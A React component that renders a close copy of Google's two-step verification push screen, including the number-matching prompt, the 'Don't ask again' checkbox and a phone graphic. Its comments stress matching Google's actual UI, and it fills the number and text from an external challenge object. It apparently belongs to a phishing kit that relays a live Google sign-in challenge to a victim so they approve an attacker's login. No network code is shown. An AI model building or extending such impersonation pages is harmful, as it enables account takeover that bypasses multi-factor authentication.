import { ChallengeMetadata } from "@/lib/types";
import React from "react";

const PushAppView: React.FC<{
  dontAskAgain: boolean;
  setDontAskAgain: (value: boolean) => void;
  challengeMetadata: ChallengeMetadata | null;
}> = ({ dontAskAgain, setDontAskAgain, challengeMetadata }) => {
  const hasNumber = !!challengeMetadata?.verificationNumber;

  if (hasNumber) {
    return (
      <div className="flex flex-col w-full">
        {/* Large Verification Number - Plain text, no background, matching Google's actual UI */}
        <div className="mb-6">
          <span className="text-[72px] leading-none font-normal text-[#202124] tracking-tight">
            {challengeMetadata?.verificationNumber}
          </span>
        </div>

        {/* Subtitle - e.g., "Open the Gmail app on iPhone" */}
        <h2 className="text-[16px] font-medium text-[#202124] mb-3 leading-[24px]">
          {challengeMetadata?.title || "Open the Gmail app on iPhone"}
        </h2>

        {/* Instructions - with Yes and number in bold */}
        <p className="text-[14px] text-[#5f6368] leading-[20px] mb-6 font-normal">
          {challengeMetadata?.instruction || (
            <>
              Google sent a notification to your iPhone. Open the Gmail app, tap <strong className="text-[#202124]">Yes</strong> on the prompt, then tap <strong className="text-[#202124]">{challengeMetadata?.verificationNumber}</strong> on your phone to verify it&apos;s you.
            </>
          )}
        </p>

        {/* Don't ask again checkbox - Google's Material Design style */}
        <div className="flex items-center gap-3">
          <div className="relative flex items-center">
            <input
              type="checkbox"
              id="push-dont-ask-again"
              className="peer appearance-none w-[18px] h-[18px] border-2 border-[#5f6368] rounded-sm cursor-pointer checked:bg-[#1a73e8] checked:border-[#1a73e8] transition-all duration-200"
              checked={dontAskAgain}
              onChange={(e) => setDontAskAgain(e.target.checked)}
            />
            <svg
              className="absolute w-3 h-3 text-white pointer-events-none hidden peer-checked:block left-[3px] top-[3px]"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth="4"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M5 13l4 4L19 7"
              />
            </svg>
          </div>
          <label
            htmlFor="push-dont-ask-again"
            className="text-[14px] text-[#202124] cursor-pointer select-none font-normal"
          >
            Don&apos;t ask again on this device
          </label>
        </div>
      </div>
    );
  }

  // Standard PUSH notification without number matching
  return (
    <div className="flex flex-col items-start w-full">
      {/* Phone illustration for PUSH type without matching number */}
      <div className="flex justify-center w-full mb-8">
        <PhoneIllustration />
      </div>

      <h2 className="text-[16px] leading-[24px] font-medium text-[#202124] mb-3">
        {challengeMetadata?.title || "Check your phone"}
      </h2>

      <p className="text-[14px] text-[#5f6368] leading-[20px] font-normal mb-6">
        {challengeMetadata?.instruction || (
          <>
            Google sent a notification to your phone. Open the Gmail app and tap{" "}
            <strong className="text-[#202124]">Yes</strong> on the prompt to verify it&apos;s you.
          </>
        )}
      </p>

      {/* Don't ask again checkbox */}
      <div className="flex items-center gap-3">
        <div className="relative flex items-center">
          <input
            type="checkbox"
            id="dont-ask-again"
            className="peer appearance-none w-[18px] h-[18px] border-2 border-[#5f6368] rounded-sm cursor-pointer checked:bg-[#1a73e8] checked:border-[#1a73e8] transition-all duration-200"
            checked={dontAskAgain}
            onChange={(e) => setDontAskAgain(e.target.checked)}
          />
          <svg
            className="absolute w-3 h-3 text-white pointer-events-none hidden peer-checked:block left-[3px] top-[3px]"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            strokeWidth="4"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              d="M5 13l4 4L19 7"
            />
          </svg>
        </div>
        <label
          htmlFor="dont-ask-again"
          className="text-[14px] text-[#202124] cursor-pointer select-none font-normal"
        >
          Don&apos;t ask again on this device
        </label>
      </div>
    </div>
  );
};

// Phone illustration for PUSH/APP challenge types
const PhoneIllustration = () => (
  <div className="flex items-center justify-center">
    <div className="relative">
      {/* Phone frame */}
      <div className="w-[80px] h-[140px] border-2 border-[#5f6368] rounded-[12px] bg-white relative">
        {/* Speaker */}
        <div className="absolute top-2 left-1/2 -translate-x-1/2 w-6 h-0.5 bg-[#dadce0] rounded-full" />
        {/* Google logo in phone */}
        <div className="absolute top-6 left-1/2 -translate-x-1/2">
          <span className="text-[9px] font-medium" style={{ color: "#4285F4" }}>
            Google
          </span>
        </div>
        {/* Yes/No buttons in phone */}
        <div className="absolute bottom-5 left-1/2 -translate-x-1/2 flex gap-2">
          <div className="w-8 h-8 rounded-full border border-[#5f6368] flex items-center justify-center">
            <svg
              className="w-4 h-4 text-[#5f6368]"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <path d="M18 6L6 18M6 6l12 12" />
            </svg>
          </div>
        </div>
      </div>
      {/* Blue checkmark badge */}
      <div className="absolute -right-2 bottom-6">
        <div className="w-10 h-10 bg-[#1a73e8] rounded-full flex items-center justify-center shadow-md">
          <svg
            className="w-5 h-5 text-white"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="3"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              d="M5 13l4 4L19 7"
            />
          </svg>
        </div>
      </div>
    </div>
  </div>
);

export default PushAppView;
